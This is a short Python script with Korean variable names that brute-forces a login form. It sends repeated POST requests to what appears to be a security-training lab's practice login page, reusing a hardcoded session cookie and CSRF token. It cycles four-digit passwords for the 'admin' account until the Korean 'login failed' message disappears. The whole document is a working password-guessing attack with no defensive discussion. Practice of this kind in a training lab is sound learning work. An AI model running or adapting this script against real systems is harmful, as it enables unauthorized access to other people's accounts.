import requests 

주소 = "https://lab.eqst.co.kr:8110/practice/practice02/login"
헤더 = {   
    "Content-Type": "application/x-www-form-urlencoded"
}
쿠키 = {
     "JSESSIONID":"48665E94E3524846C0235B401763FAF8"
}
데이터 = {
    "_csrf":"cee2c85f-dd57-4b70-9448-75c09f924b65",
    "memberid":"admin",
    "password": "0000"
}

응답 = requests.post(url=주소, headers=헤더, cookies=쿠키, data=데이터)

for i in range(750, 850):
    pw = str(i).zfill(4)
    데이터['password'] = pw
    응답 = requests.post(url=주소, headers=헤더, cookies=쿠키, data=데이터)
    if '로그인에 실패했습니다.' in 응답.text:
        print(f"{pw}는 비밀번호 아님!")
    else:
        print(f"비밀번호 찾았다! {pw}")
        break
